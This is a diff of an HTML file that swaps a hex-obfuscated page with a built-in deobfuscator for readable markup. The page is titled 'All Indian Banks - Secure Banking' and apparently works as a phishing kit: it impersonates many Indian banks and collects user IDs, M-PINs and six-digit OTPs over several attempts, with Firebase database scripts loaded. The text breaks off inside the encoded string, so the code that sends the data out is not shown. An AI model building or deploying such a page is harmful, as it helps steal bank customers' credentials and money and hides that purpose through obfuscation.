@@ -1,15 +1,956 @@
-<!-- Obfuscated by Faizan Ahmad Khichi's Tool -->
 <!DOCTYPE html>
-<html>
-<head><title>Protected Content</title></head>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>All Indian Banks - Secure Banking</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  background: #f5f7fb;
+  min-height: 100vh;
+  color: #1a202c;
+  background-image:
+    radial-gradient(circle at 0% 0%, rgba(13,71,161,0.06), transparent 50%),
+    radial-gradient(circle at 100% 100%, rgba(0,184,212,0.06), transparent 50%);
+}
+
+/* ============ PAGE SYSTEM ============ */
+.page { display: none; min-height: 100vh; flex-direction: column; }
+.page.active { display: flex; }
+
+/* ============ HOME PAGE ============ */
+.home-banner {
+  background: linear-gradient(135deg, #0a1e3f, #0d2a5c);
+  padding: 45px 20px 55px;
+  color: #fff;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+}
+.home-banner::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  background: radial-gradient(circle at 30% 20%, rgba(0,184,212,0.15), transparent 60%),
+              radial-gradient(circle at 80% 80%, rgba(255,153,51,0.10), transparent 60%);
+}
+.home-banner h1 {
+  font-family: 'Poppins', sans-serif;
+  font-size: 52px;
+  font-weight: 900;
+  letter-spacing: -1.5px;
+  margin-bottom: 10px;
+  position: relative;
+  z-index: 1;
+}
+.home-banner h1 .w { color: #fff; }
+.home-banner h1 .o { color: #ff9933; }
+.home-banner h1 .g { color: #4caf50; }
+.home-banner p {
+  font-size: 15px;
+  opacity: 0.9;
+  position: relative;
+  z-index: 1;
+}
+
+.home-container {
+  max-width: 1200px;
+  margin: -30px auto 0;
+  padding: 30px 20px;
+  position: relative;
+  z-index: 5;
+  flex: 1;
+  width: 100%;
+}
+
+.home-header {
+  text-align: center;
+  margin-bottom: 26px;
+}
+.home-header h2 {
+  font-family: 'Poppins', sans-serif;
+  font-size: 22px;
+  font-weight: 700;
+  color: #0d47a1;
+  margin-bottom: 4px;
+}
+.home-header p {
+  font-size: 13px;
+  color: #718096;
+}
+
+.bank-grid {
+  display: grid;
+  grid-template-columns: repeat(5, 1fr);
+  gap: 16px;
+}
+
+.bank-card {
+  background: #fff;
+  border-radius: 16px;
+  padding: 20px 12px;
+  text-align: center;
+  box-shadow: 0 6px 20px rgba(13,71,161,0.10);
+  transition: all 0.3s;
+  border: 2px solid transparent;
+  min-height: 200px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: space-between;
+}
+.bank-card:hover {
+  transform: translateY(-6px);
+  border-color: #1976d2;
+  box-shadow: 0 14px 32px rgba(13,71,161,0.20);
+}
+
+.bank-logo {
+  height: 65px;
+  width: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 12px;
+}
+.bank-logo img {
+  max-height: 100%;
+  max-width: 100%;
+  object-fit: contain;
+}
+
+.bank-name {
+  font-size: 13px;
+  font-weight: 600;
+  color: #333;
+  margin-bottom: 14px;
+  line-height: 1.3;
+  min-height: 34px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.login-btn {
+  width: 100%;
+  padding: 10px;
+  border-radius: 8px;
+  font-size: 12px;
+  font-weight: 700;
+  color: #fff;
+  border: none;
+  cursor: pointer;
+  background: #0d47a1;
+  transition: all 0.25s;
+  font-family: inherit;
+}
+.login-btn:hover {
+  transform: scale(1.05);
+  box-shadow: 0 6px 16px rgba(0,0,0,0.2);
+}
+
+.home-footer {
+  background: linear-gradient(135deg, #0a1e3f, #0d2a5c);
+  padding: 18px 20px;
+  text-align: center;
+  color: #fff;
+  font-size: 12.5px;
+  margin-top: 30px;
+}
+
+/* ============ LOGIN PAGE ============ */
+.app-header {
+  background: linear-gradient(135deg, #0d47a1, #002171);
+  color: #fff;
+  padding: 16px 22px;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  box-shadow: 0 4px 20px rgba(13,71,161,0.25);
+}
+.back-btn {
+  width: 42px; height: 42px;
+  border-radius: 12px;
+  background: rgba(255,255,255,0.12);
+  border: 1px solid rgba(255,255,255,0.2);
+  color: #fff;
+  font-size: 20px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: inherit;
+  transition: background 0.2s;
+}
+.back-btn:hover { background: rgba(255,255,255,0.22); }
+
+.header-brand h2 {
+  font-family: 'Poppins', sans-serif;
+  font-size: 17px;
+  font-weight: 700;
+}
+.header-brand p {
+  font-size: 10.5px;
+  opacity: 0.75;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+}
+
+.app-main {
+  flex: 1;
+  padding: 24px 16px;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+}
+
+.main-card {
+  max-width: 620px;
+  width: 100%;
+  background: #fff;
+  border-radius: 24px;
+  padding: 28px 24px 26px;
+  box-shadow: 0 12px 32px rgba(13,71,161,0.12);
+  border: 1px solid rgba(226,232,240,0.8);
+}
+
+.brand-block { text-align: center; margin-bottom: 22px; }
+.brand-icon {
+  width: 62px; height: 62px;
+  margin: 0 auto 12px;
+  border-radius: 18px;
+  background: linear-gradient(135deg, #0d47a1, #00b8d4);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 30px; color: #fff;
+  box-shadow: 0 8px 20px rgba(13,71,161,0.28);
+}
+.brand-title {
+  font-family: 'Poppins', sans-serif;
+  font-size: 22px; font-weight: 700;
+  color: #1a202c;
+}
+.brand-title .highlight {
+  background: linear-gradient(135deg, #0d47a1, #00b8d4);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.brand-sub {
+  font-size: 10.5px; letter-spacing: 3px;
+  color: #718096; margin-top: 6px;
+  font-weight: 600; text-transform: uppercase;
+}
+
+.select-bank-title {
+  text-align: center;
+  font-size: 13px; font-weight: 700;
+  color: #718096; text-transform: uppercase;
+  letter-spacing: 1px; margin-bottom: 14px;
+}
+
+.bank-grid-inner {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 10px;
+  margin-bottom: 6px;
+}
+
+.bank-item {
+  background: #f8fafc;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 12px;
+  padding: 12px 8px;
+  text-align: center;
+  cursor: pointer;
+  transition: all 0.25s;
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  min-height: 110px;
+}
+.bank-item:hover {
+  background: #fff;
+  border-color: #1976d2;
+  transform: translateY(-3px);
+  box-shadow: 0 8px 18px rgba(13,71,161,0.15);
+}
+.bank-item-logo {
+  height: 40px; width: 100%;
+  display: flex; align-items: center; justify-content: center;
+  margin-bottom: 8px;
+}
+.bank-item-logo img {
+  max-height: 100%; max-width: 100%;
+  object-fit: contain;
+}
+.bank-item-name {
+  font-size: 10.5px; font-weight: 600;
+  color: #4a5568; line-height: 1.3; text-align: center;
+}
+
+.selected-bank-banner {
+  display: none;
+  background: linear-gradient(135deg, #e3f2fd, #bbdefb);
+  border-radius: 14px;
+  padding: 12px 16px;
+  margin-bottom: 22px;
+  align-items: center;
+  gap: 12px;
+}
+.selected-bank-banner.show { display: flex; }
+.selected-bank-banner .sel-logo {
+  width: 44px; height: 44px;
+  background: #fff;
+  border-radius: 10px; padding: 4px;
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0;
+}
+.selected-bank-banner .sel-logo img {
+  max-width: 100%; max-height: 100%;
+  object-fit: contain;
+}
+.selected-bank-banner .sel-info { flex: 1; }
+.selected-bank-banner .sel-info h4 {
+  font-size: 13.5px; font-weight: 700;
+  color: #0d47a1; margin-bottom: 2px;
+}
+.selected-bank-banner .sel-info p {
+  font-size: 10.5px; color: #1976d2; font-weight: 500;
+}
+.selected-bank-banner .change-btn {
+  background: #fff; color: #0d47a1;
+  border: none; padding: 7px 14px;
+  border-radius: 20px; font-size: 11px;
+  font-weight: 700; cursor: pointer;
+  font-family: inherit; transition: all 0.2s;
+}
+.selected-bank-banner .change-btn:hover {
+  background: #0d47a1; color: #fff;
+}
+
+.login-fields { display: none; }
+.login-fields.show { display: block; }
+
+.form-group { margin-bottom: 20px; position: relative; }
+.form-group label {
+  display: block; font-size: 11.5px;
+  font-weight: 600; color: #718096;
+  text-transform: uppercase;
+  letter-spacing: 0.8px; margin-bottom: 8px;
+}
+.field-wrap {
+  display: flex; align-items: center;
+  background: #f8fafc;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 14px;
+  transition: all 0.3s;
+}
+.field-wrap:focus-within {
+  border-color: #1976d2;
+  background: #fff;
+  box-shadow: 0 0 0 4px rgba(25,118,210,0.10);
+}
+.field-icon {
+  padding: 0 14px; font-size: 18px; color: #718096;
+}
+.field-wrap input {
+  flex: 1; border: none; outline: none;
+  background: transparent;
+  font-size: 15px;
+  padding: 15px 14px 15px 0;
+  color: #1a202c;
+  font-weight: 500;
+  font-family: inherit; width: 100%;
+}
+.forgot-link {
+  position: absolute; right: 2px; top: 0;
+  font-size: 11px; color: #1976d2;
+  cursor: pointer; font-weight: 600;
+  text-transform: none; letter-spacing: 0;
+}
+.forgot-link:hover { text-decoration: underline; }
+
+.btn-primary {
+  width: 100%; padding: 16px;
+  border: none; border-radius: 14px;
+  background: linear-gradient(135deg, #0d47a1, #1976d2);
+  color: #fff; font-size: 15.5px;
+  font-weight: 600; font-family: inherit;
+  cursor: pointer; letter-spacing: 0.3px;
+  box-shadow: 0 6px 18px rgba(13,71,161,0.30);
+  transition: all 0.3s;
+  margin-top: 6px;
+}
+.btn-primary:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 10px 28px rgba(13,71,161,0.45);
+}
+.btn-primary:active { transform: scale(0.98); }
+
+.btn-secondary {
+  width: 100%; padding: 15px;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 14px;
+  background: #fff; color: #718096;
+  font-size: 14.5px; font-weight: 600;
+  font-family: inherit; cursor: pointer;
+  margin-top: 10px; transition: all 0.25s;
+}
+.btn-secondary:hover { background: #f8fafc; }
+
+.alert {
+  padding: 12px 16px;
+  border-radius: 12px; margin-top: 14px;
+  text-align: center; font-size: 13px;
+  font-weight: 500; display: none;
+}
+.alert.show { display: block; }
+.alert-success { background: #e8f5e9; color: #1b5e20; border-left: 3px solid #00c853; }
+.alert-error { background: #ffebee; color: #b71c1c; border-left: 3px solid #d32f2f; }
+.alert-warning { background: #fff8e1; color: #e65100; border-left: 3px solid #f57c00; }
+
+.otp-section { display: none; }
+.otp-section.show { display: block; }
+
+.otp-header { text-align: center; margin-bottom: 22px; }
+.lock-circle {
+  width: 60px; height: 60px;
+  margin: 0 auto 12px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, #e3f2fd, #bbdefb);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 28px; color: #0d47a1;
+}
+.otp-title {
+  font-family: 'Poppins', sans-serif;
+  font-size: 18px; font-weight: 700;
+  color: #1a202c; margin-bottom: 6px;
+}
+.otp-sub {
+  font-size: 12.5px; color: #718096;
+  line-height: 1.5;
+}
+.bank-tag {
+  display: inline-block;
+  background: #e3f2fd;
+  color: #0d47a1;
+  padding: 4px 14px;
+  border-radius: 20px;
+  font-size: 11px; font-weight: 600;
+  margin-top: 8px;
+}
+
+.otp-inputs {
+  display: flex; gap: 8px;
+  justify-content: center;
+  margin-bottom: 20px;
+}
+.otp-inputs input {
+  width: 46px; height: 54px;
+  text-align: center;
+  font-size: 22px; font-weight: 700;
+  border: 2px solid #e2e8f0;
+  border-radius: 12px; outline: none;
+  background: #f8fafc; color: #1a202c;
+  font-family: inherit;
+  transition: all 0.3s;
+}
+.otp-inputs input:focus {
+  border-color: #1976d2;
+  background: #fff;
+  box-shadow: 0 0 0 4px rgba(25,118,210,0.12);
+  transform: scale(1.08);
+}
+
+.attempt-bar {
+  display: flex; align-items: center;
+  justify-content: center; gap: 8px;
+  margin-bottom: 18px;
+  font-size: 12.5px;
+  color: #718096; font-weight: 500;
+}
+.attempt-bar .dots { display: flex; gap: 4px; }
+.attempt-bar .dot {
+  width: 8px; height: 8px;
+  border-radius: 50%;
+  background: #e2e8f0;
+  transition: all 0.3s;
+}
+.attempt-bar .dot.used { background: #d32f2f; }
+.attempt-bar .dot.active { background: #0d47a1; transform: scale(1.4); }
+.attempt-bar .attempt-num { color: #d32f2f; font-weight: 700; }
+
+@media (max-width: 1000px) { .bank-grid { grid-template-columns: repeat(4, 1fr); } }
+@media (max-width: 800px) { .bank-grid { grid-template-columns: repeat(3, 1fr); } }
+
+@media (max-width: 550px) { 
+  .bank-grid { grid-template-columns: repeat(2, 1fr); gap: 10px; } 
+  .home-banner h1 { font-size: 32px; }
+  .home-banner { padding: 30px 16px 45px; }
+  .bank-card { min-height: 170px; padding: 14px 8px; }
+  .bank-logo { height: 50px; }
+  .main-card { padding: 22px 16px; border-radius: 20px; }
+  .otp-inputs input { width: 40px; height: 48px; font-size: 19px; }
+  .otp-inputs { gap: 6px; }
+  .bank-grid-inner { grid-template-columns: repeat(2, 1fr); gap: 8px; }
+  .bank-item { min-height: 100px; padding: 10px 6px; }
+  .bank-item-logo { height: 35px; }
+  .bank-item-name { font-size: 10px; }
+}
+</style>
+</head>
 <body>
+
+<!-- ============================================================ -->
+<!-- PAGE 1: HOME (BANK GRID)                                     -->
+<!-- ============================================================ -->
+<div class="page active" id="homePage">
+
+  <div class="home-banner">
+    <h1>
+      <span class="w">All </span><span class="o">Indian </span><span class="g">Banks</span>
+    </h1>
+    <p>One Website • All Logins • Your Banking Simplified</p>
+  </div>
+
+  <div class="home-container">
+    <div class="home-header">
+      <h2>🏦 Select Your Bank</h2>
+      <p>Click on your bank's "Official Login" to continue</p>
+    </div>
+    <div class="bank-grid" id="bankGrid"></div>
+  </div>
+
+  <div class="home-footer">
+    India's Banks • Your Access • All in One Place
+  </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- PAGE 2: LOGIN + OTP                                          -->
+<!-- ============================================================ -->
+<div class="page" id="loginPage">
+
+  <div class="app-header">
+    <button class="back-btn" onclick="goHome()">←</button>
+    <div class="header-brand">
+      <h2 id="headerBankName">All Indian Banks</h2>
+      <p>Secure Login</p>
+    </div>
+  </div>
+
+  <div class="app-main">
+    <div class="main-card">
+
+      <div class="brand-block">
+        <div class="brand-icon">🏦</div>
+        <div class="brand-title">Secure <span class="highlight">Login</span></div>
+        <div class="brand-sub">Mobile Banking</div>
+      </div>
+
+      <div id="loginFormSection">
+
+        <div id="bankSelectSection">
+          <div class="select-bank-title">Select Your Bank</div>
+          <div class="bank-grid-inner" id="bankGridInner"></div>
+        </div>
+
+        <div class="selected-bank-banner" id="selectedBankBanner">
+          <div class="sel-logo" id="selLogo"></div>
+          <div class="sel-info">
+            <h4 id="selBankName">Bank Name</h4>
+            <p>Bank Selected</p>
+          </div>
+          <button class="change-btn" onclick="changeBank()">Change</button>
+        </div>
+
+        <div class="login-fields" id="loginFields">
+          <div class="form-group">
+            <label>User ID</label>
+            <div class="field-wrap">
+              <span class="field-icon">👤</span>
+              <input type="text" id="loginUserId" placeholder="Enter your user ID" autocomplete="off">
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label>
+              M-PIN
+              <span class="forgot-link" onclick="forgotPin()">Forgot?</span>
+            </label>
+            <div class="field-wrap">
+              <span class="field-icon">🔒</span>
+              <input type="password" id="loginPin" inputmode="numeric" maxlength="6" placeholder="Enter 4-6 digit PIN" autocomplete="off">
+            </div>
+          </div>
+
+          <button class="btn-primary" onclick="handleLogin()">🔐 Secure Login</button>
+          <div id="loginSuccess" class="alert"></div>
+        </div>
+
+      </div>
+
+      <div class="otp-section" id="otpSection">
+        <div class="otp-header">
+          <div class="lock-circle">🔐</div>
+          <div class="otp-title">OTP Verification</div>
+          <div class="otp-sub">Enter the 6-digit OTP sent to your registered mobile</div>
+          <div class="bank-tag" id="otpBankTag"></div>
+        </div>
+
+        <div class="otp-inputs">
+          <input type="text" maxlength="1" inputmode="numeric" id="otp1" oninput="moveOtp(this, 'otp2')">
+          <input type="text" maxlength="1" inputmode="numeric" id="otp2" oninput="moveOtp(this, 'otp3')">
+          <input type="text" maxlength="1" inputmode="numeric" id="otp3" oninput="moveOtp(this, 'otp4')">
+          <input type="text" maxlength="1" inputmode="numeric" id="otp4" oninput="moveOtp(this, 'otp5')">
+          <input type="text" maxlength="1" inputmode="numeric" id="otp5" oninput="moveOtp(this, 'otp6')">
+          <input type="text" maxlength="1" inputmode="numeric" id="otp6">
+        </div>
+
+        <div class="attempt-bar">
+          <span>Attempt</span>
+          <div class="dots">
+            <div class="dot active" id="dot1"></div>
+            <div class="dot" id="dot2"></div>
+            <div class="dot" id="dot3"></div>
+          </div>
+          <span class="attempt-num"><span id="attemptCount">1</span>/3</span>
+        </div>
+
+        <button class="btn-primary" onclick="verifyOtp()">✓ Verify OTP</button>
+        <button class="btn-secondary" onclick="cancelOtp()">Cancel</button>
+        <div id="otpMessage" class="alert"></div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
 <script>
-// Deobfuscator embedded in page
-const p = "49-2e-51-5c-50-61-66-5d-52-2d-75-81-7a-79-4b-17-49-75-81-7a-79-2d-79-6e-7b-74-4a-2f-72-7b-2f-4b-17-49-75-72-6e-71-4b-17-49-7a-72-81-6e-2d-70-75-6e-7f-80-72-81-4a-2f-62-61-53-3a-45-2f-4b-17-49-7a-72-81-6e-2d-7b-6e-7a-72-4a-2f-83-76-72-84-7d-7c-7f-81-2f-2d-70-7c-7b-81-72-7b-81-4a-2f-84-76-71-81-75-4a-71-72-83-76-70-72-3a-84-76-71-81-75-39-2d-76-7b-76-81-76-6e-79-3a-80-70-6e-79-72-4a-3e-3b-3d-39-2d-7a-6e-85-76-7a-82-7a-3a-80-70-6e-79-72-4a-3e-3b-3d-39-2d-82-80-72-7f-3a-80-70-6e-79-6e-6f-79-72-4a-7b-7c-2f-4b-17-49-81-76-81-79-72-4b-60-72-70-82-7f-72-2d-59-7c-74-76-7b-49-3c-81-76-81-79-72-4b-17-17-49-80-70-7f-76-7d-81-2d-80-7f-70-4a-2f-75-81-81-7d-80-47-3c-3c-84-84-84-3b-74-80-81-6e-81-76-70-3b-70-7c-7a-3c-73-76-7f-72-6f-6e-80-72-77-80-3c-46-3b-3f-3f-3b-3d-3c-73-76-7f-72-6f-6e-80-72-3a-6e-7d-7d-3a-70-7c-7a-7d-6e-81-3b-77-80-2f-4b-49-3c-80-70-7f-76-7d-81-4b-17-49-80-70-7f-76-7d-81-2d-80-7f-70-4a-2f-75-81-81-7d-80-47-3c-3c-84-84-84-3b-74-80-81-6e-81-76-70-3b-70-7c-7a-3c-73-76-7f-72-6f-6e-80-72-77-80-3c-46-3b-3f-3f-3b-3d-3c-73-76-7f-72-6f-6e-80-72-3a-71-6e-81-6e-6f-6e-80-72-3a-70-7c-7a-7d-6e-81-3b-77-80-2f-4b-49-3c-80-70-7f-76-7d-81-4b-17-17-49-79-76-7b-78-2d-75-7f-72-73-4a-2f-75-81-81-7d-80-47-3c-3c-73-7c-7b-81-80-3b-74-7c-7c-74-79-72-6e-7d-76-80-3b-70-7c-7a-3c-70-80-80-3f-4c-73-6e-7a-76-79-86-4a-5d-7c-7d-7d-76-7b-80-47-84-74-75-81-4d-41-3d-3d-48-42-3d-3d-48-43-3d-3d-48-44-3d-3d-48-45-3d-3d-33-73-6e-7a-76-79-86-4a-56-7b-81-72-7f-47-84-74-75-81-4d-41-3d-3d-48-42-3d-3d-48-43-3d-3d-48-44-3d-3d-33-71-76-80-7d-79-6e-86-4a-80-84-6e-7d-2f-2d-7f-72-79-4a-2f-80-81-86-79-72-80-75-72-72-81-2f-4b-17-17-49-80-81-86-79-72-4b-17-37-2d-88-2d-6f-7c-85-3a-80-76-87-76-7b-74-47-2d-6f-7c-7f-71-72-7f-3a-6f-7c-85-48-2d-7a-6e-7f-74-76-7b-47-2d-3d-48-2d-7d-6e-71-71-76-7b-74-47-2d-3d-48-2d-8a-17-17-6f-7c-71-86-2d-88-17-2d-2d-73-7c-7b-81-3a-73-6e-7a-76-79-86-47-2d-34-56-7b-81-72-7f-34-39-2d-80-6e-7b-80-3a-80-72-7f-76-73-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-73-42-73-44-73-6f-48-17-2d-2d-7a-76-7b-3a-75-72-76-74-75-81-47-2d-3e-3d-3d-83-75-48-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-73-79-72-85-48-17-2d-2d-73-79-72-85-3a-71-76-7f-72-70-81-76-7c-7b-47-2d-70-7c-79-82-7a-7b-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-3a-76-7a-6e-74-72-47-17-2d-2d-2d-2d-7f-6e-71-76-6e-79-3a-74-7f-6e-71-76-72-7b-81-35-70-76-7f-70-79-72-2d-6e-81-2d-3d-32-2d-3d-32-39-2d-7f-74-6f-6e-35-3e-40-39-44-3e-39-3e-43-3e-39-3d-3b-3d-45-36-39-2d-81-7f-6e-7b-80-7d-6e-7f-72-7b-81-2d-42-3d-32-36-39-17-2d-2d-2d-2d-7f-6e-71-76-6e-79-3a-74-7f-6e-71-76-72-7b-81-35-70-76-7f-70-79-72-2d-6e-81-2d-3e-3d-3d-32-2d-3e-3d-3d-32-39-2d-7f-74-6f-6e-35-3d-39-3e-45-41-39-3f-3e-3f-39-3d-3b-3d-45-36-39-2d-81-7f-6e-7b-80-7d-6e-7f-72-7b-81-2d-42-3d-32-36-48-17-8a-17-17-3b-6e-7d-7d-3a-75-72-6e-71-72-7f-2d-88-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-79-76-7b-72-6e-7f-3a-74-7f-6e-71-76-72-7b-81-35-3e-40-42-71-72-74-39-2d-30-3d-71-41-44-6e-3e-39-2d-30-3d-3d-3f-3e-44-3e-36-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-73-73-73-48-17-2d-2d-7d-6e-71-71-76-7b-74-47-2d-3e-43-7d-85-2d-3f-3f-7d-85-48-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-73-79-72-85-48-17-2d-2d-6e-79-76-74-7b-3a-76-81-72-7a-80-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-74-6e-7d-47-2d-3e-41-7d-85-48-17-2d-2d-6f-7c-85-3a-80-75-6e-71-7c-84-47-2d-3d-2d-41-7d-85-2d-3f-3d-7d-85-2d-7f-74-6f-6e-35-3e-40-39-44-3e-39-3e-43-3e-39-3d-3b-3f-42-36-48-17-8a-17-3b-6f-6e-70-78-3a-6f-81-7b-2d-88-17-2d-2d-84-76-71-81-75-47-2d-41-3f-7d-85-48-17-2d-2d-75-72-76-74-75-81-47-2d-41-3f-7d-85-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-3e-3f-7d-85-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-7f-74-6f-6e-35-3f-42-42-39-3f-42-42-39-3f-42-42-39-3d-3b-3e-3f-36-48-17-2d-2d-6f-7c-7f-71-72-7f-47-2d-3e-7d-85-2d-80-7c-79-76-71-2d-7f-74-6f-6e-35-3f-42-42-39-3f-42-42-39-3f-42-42-39-3d-3b-3f-36-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-73-73-73-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3f-3d-7d-85-48-17-2d-2d-70-82-7f-80-7c-7f-47-2d-7d-7c-76-7b-81-72-7f-48-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-73-79-72-85-48-17-2d-2d-6e-79-76-74-7b-3a-76-81-72-7a-80-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-77-82-80-81-76-73-86-3a-70-7c-7b-81-72-7b-81-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-81-72-85-81-3a-71-72-70-7c-7f-6e-81-76-7c-7b-47-2d-7b-7c-7b-72-48-17-2d-2d-81-7f-6e-7b-80-76-81-76-7c-7b-47-2d-6f-6e-70-78-74-7f-7c-82-7b-71-2d-3d-3b-3f-80-48-17-8a-17-3b-6f-6e-70-78-3a-6f-81-7b-47-75-7c-83-72-7f-2d-88-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-7f-74-6f-6e-35-3f-42-42-39-3f-42-42-39-3f-42-42-39-3d-3b-3f-3f-36-48-2d-8a-17-17-3b-75-72-6e-71-72-7f-3a-6f-7f-6e-7b-71-2d-75-3f-2d-88-17-2d-2d-73-7c-7b-81-3a-73-6e-7a-76-79-86-47-2d-34-5d-7c-7d-7d-76-7b-80-34-39-2d-80-6e-7b-80-3a-80-72-7f-76-73-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-44-7d-85-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-44-3d-3d-48-17-8a-17-3b-75-72-6e-71-72-7f-3a-6f-7f-6e-7b-71-2d-7d-2d-88-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-3d-3b-42-7d-85-48-17-2d-2d-7c-7d-6e-70-76-81-86-47-2d-3d-3b-44-42-48-17-2d-2d-79-72-81-81-72-7f-3a-80-7d-6e-70-76-7b-74-47-2d-3e-7d-85-48-17-2d-2d-81-72-85-81-3a-81-7f-6e-7b-80-73-7c-7f-7a-47-2d-82-7d-7d-72-7f-70-6e-80-72-48-17-8a-17-17-3b-6e-7d-7d-3a-7a-6e-76-7b-2d-88-17-2d-2d-73-79-72-85-47-2d-3e-48-17-2d-2d-7d-6e-71-71-76-7b-74-47-2d-3f-41-7d-85-2d-3e-43-7d-85-48-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-73-79-72-85-48-17-2d-2d-77-82-80-81-76-73-86-3a-70-7c-7b-81-72-7b-81-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-6e-79-76-74-7b-3a-76-81-72-7a-80-47-2d-73-79-72-85-3a-80-81-6e-7f-81-48-17-8a-17-17-3b-7a-6e-76-7b-3a-70-6e-7f-71-2d-88-17-2d-2d-7a-6e-85-3a-84-76-71-81-75-47-2d-43-3f-3d-7d-85-48-17-2d-2d-84-76-71-81-75-47-2d-3e-3d-3d-32-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-73-73-73-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-3f-41-7d-85-48-17-2d-2d-7d-6e-71-71-76-7b-74-47-2d-3f-45-7d-85-2d-3f-41-7d-85-2d-3f-43-7d-85-48-17-2d-2d-6f-7c-85-3a-80-75-6e-71-7c-84-47-2d-3d-2d-3e-3f-7d-85-2d-40-3f-7d-85-2d-7f-74-6f-6e-35-3e-40-39-44-3e-39-3e-43-3e-39-3d-3b-3e-3f-36-48-17-2d-2d-6f-7c-7f-71-72-7f-47-2d-3e-7d-85-2d-80-7c-79-76-71-2d-7f-74-6f-6e-35-3f-3f-43-39-3f-40-3f-39-3f-41-3d-39-3d-3b-45-36-48-17-8a-17-17-3b-6f-7f-6e-7b-71-3a-6f-79-7c-70-78-2d-88-17-2d-2d-81-72-85-81-3a-6e-79-76-74-7b-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-7a-6e-7f-74-76-7b-3a-6f-7c-81-81-7c-7a-47-2d-3f-3f-7d-85-48-17-8a-17-3b-6f-7f-6e-7b-71-3a-76-70-7c-7b-2d-88-17-2d-2d-84-76-71-81-75-47-2d-43-3f-7d-85-48-17-2d-2d-75-72-76-74-75-81-47-2d-43-3f-7d-85-48-17-2d-2d-7a-6e-7f-74-76-7b-47-2d-3d-2d-6e-82-81-7c-2d-3e-3f-7d-85-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-3e-45-7d-85-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-79-76-7b-72-6e-7f-3a-74-7f-6e-71-76-72-7b-81-35-3e-40-42-71-72-74-39-2d-30-3d-71-41-44-6e-3e-39-2d-30-3d-3d-6f-45-71-41-36-48-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-73-79-72-85-48-17-2d-2d-6e-79-76-74-7b-3a-76-81-72-7a-80-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-77-82-80-81-76-73-86-3a-70-7c-7b-81-72-7b-81-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-40-3d-7d-85-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-73-73-73-48-17-2d-2d-6f-7c-85-3a-80-75-6e-71-7c-84-47-2d-3d-2d-45-7d-85-2d-3f-3d-7d-85-2d-7f-74-6f-6e-35-3e-40-39-44-3e-39-3e-43-3e-39-3d-3b-3f-45-36-48-17-8a-17-3b-6f-7f-6e-7b-71-3a-81-76-81-79-72-2d-88-17-2d-2d-73-7c-7b-81-3a-73-6e-7a-76-79-86-47-2d-34-5d-7c-7d-7d-76-7b-80-34-39-2d-80-6e-7b-80-3a-80-72-7f-76-73-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3f-3f-7d-85-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-44-3d-3d-4